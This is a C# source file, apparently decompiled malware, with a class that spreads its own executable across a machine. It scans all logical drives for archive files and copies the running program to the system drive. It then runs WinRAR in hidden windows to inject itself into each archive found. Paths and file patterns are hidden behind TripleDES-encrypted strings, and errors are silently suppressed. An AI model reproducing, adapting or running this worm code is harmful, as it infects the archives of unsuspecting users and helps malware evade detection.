using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

public class Rar
{
	private static string _rarPath;

	private static string _copiedExeName;

	public static bool Check()
	{
		if (Directory.Exists(Class1.TripleDES("rt8h1uHRaXcSrcIPdad49Q==", "SxJVscZICkToJRWuZILbFGeUhGT0cfxxl80afk4ahhgAc", d: true)))
		{
			return true;
		}
		return false;
	}

	public static void INF(string path)
	{
		try
		{
			if (Check())
			{
				ZipSpread(Class1.TripleDES("cRkW0cdmO3Q=", "SUiIc976WAUmbU9r673tU1s6JXFxrOss54CyfkxL195xM", d: true), path);
			}
			else
			{
				ZipSpread(Class1.TripleDES("EIv7wVIQDrY=", "SKIsFp12XQ7MRUJzBzlcB7pe3xb1Blv6wqYINkkJLD7CN", d: true), path);
			}
			Spread(path);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void ZipSpread(string MainDir, string YourFile)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		ListBox val = new ListBox();
		try
		{
			string[] directories = Directory.GetDirectories(MainDir);
			foreach (string text in directories)
			{
				string[] files = Directory.GetFiles(text, Class1.TripleDES("mjGrDTD+nOY=", "SIuNpFxgrvsoCEmZgA2EqSbmZiNgmiKL5MISUXkN9DyHZ", d: true));
				foreach (string text2 in files)
				{
					val.get_Items().Add((object)text2);
				}
				ZipSpread(text, YourFile);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = val.get_Items().GetEnumerator();
			while (enumerator.MoveNext())
			{
				object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				processStartInfo.FileName = folderPath + Class1.TripleDES("tC0pQz3fUiFa0FhwuLQivA==", "SAjQwjoVv1DzNHcgMJkncvbt7oZXbUsOdfkKUUpwOIAtJ", d: true);
				processStartInfo.Arguments = " a " + objectValue.ToString() + " " + YourFile;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	public static extern int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string path, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder shortPath, int shortPathLength);

	private static void Search(string pathName)
	{
		string[] files = Directory.GetFiles(pathName);
		string[] array = files;
		foreach (string text in array)
		{
			if (text.Contains(Class1.TripleDES("O3ZY/wI6ObY=", "SWio4Q8BIjGf3QOT8JWnjxHQWMP8oUlfksSkeyoC0BYQK", d: true)))
			{
				RarStart(text);
			}
			if (text.Contains(Class1.TripleDES("23I8gkbKdhQ=", "Sf5MvwP5jnIialsnfub28CKGjKry4MSVfu4KQFRwfEDg8", d: true)))
			{
				RarStart(text);
			}
		}
		string[] directories = Directory.GetDirectories(pathName);
		string[] array2 = directories;
		foreach (string pathName2 in array2)
		{
			Search(pathName2);
		}
	}

	public static void Spread(string myExeName)
	{
		_copiedExeName = myExeName;
		string[] logicalDrives = Environment.GetLogicalDrives();
		string[] array = logicalDrives;
		foreach (string pathName in array)
		{
			Search(pathName);
		}
		File.Create(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class1.TripleDES("nfDfmwYk5xWPLPgimHrf5A==", "SXlGDzp9DP9HWbvwV5yyA5Mm2sLcfM8o9VyRLehWT1JvI", d: true));
	}

	public static void RarStart(string archiveToInject)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		string path = folderPath.Replace(folderPath.Substring(folderPath.IndexOf("\\")), string.Empty) + "\\";
		_rarPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + Class1.TripleDES("/OQGu5RM63c02j7yciT1aReGtpOCDgDJ", "SclhToKoRWaedr5vFv1CRBN0OoUMh25lFYe7TVCpO1csz", d: true);
		if (File.Exists(_rarPath))
		{
			if (!File.Exists(Path.Combine(path, _copiedExeName)))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(path, _copiedExeName));
			}
			StringBuilder stringBuilder = new StringBuilder(255);
			GetShortPathName(Path.Combine(path, _copiedExeName), stringBuilder, stringBuilder.Capacity);
			string text = stringBuilder.ToString();
			object obj = new StringBuilder(255);
			GetShortPathName(archiveToInject, (StringBuilder)obj, Conversions.ToInteger(NewLateBinding.LateGet(obj, (Type)null, "Capacity", new object[0], (string[])null, (Type[])null, (bool[])null)));
			try
			{
				ProcessStartInfo processStartInfo = new ProcessStartInfo();
				string arguments = Conversions.ToString(Operators.AddObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)" a ", obj), (object)" "), (object)text));
				processStartInfo.FileName = _rarPath;
				processStartInfo.Arguments = arguments;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(processStartInfo);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
